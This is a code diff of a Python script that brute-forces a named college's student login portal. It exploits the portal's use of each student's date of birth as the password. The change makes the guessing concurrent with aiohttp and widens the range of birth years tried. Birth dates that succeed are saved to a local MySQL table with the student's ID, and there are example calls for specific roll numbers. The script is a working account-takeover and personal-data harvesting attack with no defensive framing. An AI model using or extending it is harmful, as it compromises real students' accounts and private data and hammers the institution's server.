@@ -1,5 +1,6 @@
-from requests import post
+from aiohttp import ClientSession
 import mysql.connector
+import asyncio
 
 student_login_url = 'http://studentlogin.kcgcollege.ac.in/'
 
@@ -25,35 +26,34 @@ def get_years(u_id, reg_no_):
         year = 2000 + int(u_id[:2])  #year from roll number  
             
     yob = year - 18
-    years = (str(yob), str(yob + 1), str(yob - 1))
+    years = (str(yob), str(yob + 1), str(yob - 1), str(yob - 2), str(yob + 2) , str(yob - 3))
     return years  
 
-def check_date(The_day_):
+async def check_date(session, The_day_):
 
     global time_out_dates, student_login_payload
 
     student_login_payload['txtpassword'] = The_day_
                 
     try:
-        page = post(student_login_url, data = student_login_payload, timeout = 10)
+        page = await session.post(student_login_url, data = student_login_payload, timeout = 10)
         #print(The_day_)
     except:
-        #print('timed out', The_day_)
-        time_out_dates.append(The_day_)               
+        pass
+                       
         
 
     #print(page.url)
-    if page.url != student_login_url: 
+    if str(page.url) != student_login_url: 
         #print('dob found 1')        
         #print(The_day_)  
         #print('dob found 2')             
-        return True
+        return The_day_
     
     return False 
 
 
-def find_student_dob(user_id, year_of_birth = None):
-    global time_out_dates
+async def find_student_dob(user_id, year_of_birth = None):
 
     mycon = mysql.connector.connect(host="localhost", passwd="rootmysql",user="root", database = 'kcg', autocommit = True)
     mysql_cursor = mycon.cursor()
@@ -85,54 +85,54 @@ def find_student_dob(user_id, year_of_birth = None):
             years = get_years(user_id, reg_no_)
         else:
             years = (year_of_birth,)         
+        
+        tasks = []
 
-        for str_yob in years:
-            for str_month in ('01','02','03','04','05','06','07','08','09','10','11','12'):
-                days = months[str_month]
+        async with ClientSession() as session:
 
-                for day in range(1,days + 1):
-                    str_day = str(day)
-                    if len(str_day) == 1:
-                        str_day = '0' + str_day
+            for str_yob in years:
+                for str_month in ('01','02','03','04','05','06','07','08','09','10','11','12'):
+                    days = months[str_month]
 
-                    The_day = str_day + str_month + str_yob
+                    for day in range(1,days + 1):
+                        str_day = str(day)
+                        if len(str_day) == 1:
+                            str_day = '0' + str_day
+
+                        The_day = str_day + str_month + str_yob
+                        tasks.append(asyncio.create_task(check_date(session, The_day)))
+
+            list_ = await asyncio.gather(*tasks)
+
+            for a in list_:
+                if a != False:
+                    dob = a               
                     
-                    if check_date(The_day):
-                        #print('dob found 3')
-                        try:
-                            mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
-                            #print('dob found 4')
-                        except:
-                            with open('dates.txt', 'a') as file:
-                                file.write('{}  {}'.format(user_id, The_day))
+                    try:
+                        mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,dob))
+                        #print('dob found 4')
+                    except:
+                        pass
 
-                        mysql_cursor.close()
-                        mycon.close()
-                        time_out_dates = []
+                    mysql_cursor.close()
+                    mycon.close()
 
-                        return The_day
+                    print(dob)
 
-        for date_ in time_out_dates: #check timeout dates
-            if check_date(date_):
-                try:
-                    mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
-                except:
-                    with open('dates.txt', 'a') as file:
-                        file.write('{}  {}'.format(user_id, The_day))
+                    return dob
 
-                mysql_cursor.close()
-                mycon.close()
-                time_out_dates = []
-
-                return date_
+    
 
                     
         
     raise Exception   
 
+'''
+async def s():
+    print(await find_student_dob('20ao04'))
 
-#print(find_student_dob('20cs050')  )
-
+asyncio.run(s())
+'''
 #find_student_dob('311020104023', '2003')                        
             
 
